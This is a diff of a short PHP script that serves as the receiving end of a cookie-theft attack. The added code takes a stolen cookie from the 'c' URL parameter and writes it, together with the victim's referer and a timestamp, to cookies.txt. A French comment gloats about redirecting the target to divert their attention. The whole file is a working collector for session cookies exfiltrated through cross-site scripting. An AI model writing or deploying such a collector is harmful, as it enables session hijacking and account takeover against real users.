@@ -1,4 +1,17 @@
 <?php
- $cookie_id = isset($_GET['cookie']) ? sprintf("Cookie ID received : %s\n",$_GET['cookie']) : "No cookie in GET parameter\n" ;
- $handle = fopen('trace.log', 'a+') ;
- fputs($handle, $cookie_id, 1024) ; ?>
+ 
+if(isset($_GET['c']) && is_string($_GET['c']) && !empty($_GET['c'])) {
+ 
+	$referer = $_SERVER['HTTP_REFERER'];
+	$date = date('d-m-Y \à H\hi');
+	$data = "From :   $referer\r\nDate :   $date\r\nCookie : ".htmlentities($_GET['c'])."\r\n------------------------------\r\n";
+ 
+	$handle = fopen('cookies.txt','a');
+	fwrite($handle, $data);
+	fclose($handle);
+ 
+}
+ 
+ 
+// et on envoie la cible où l'on veut pour détourner son attention ;)
+?>
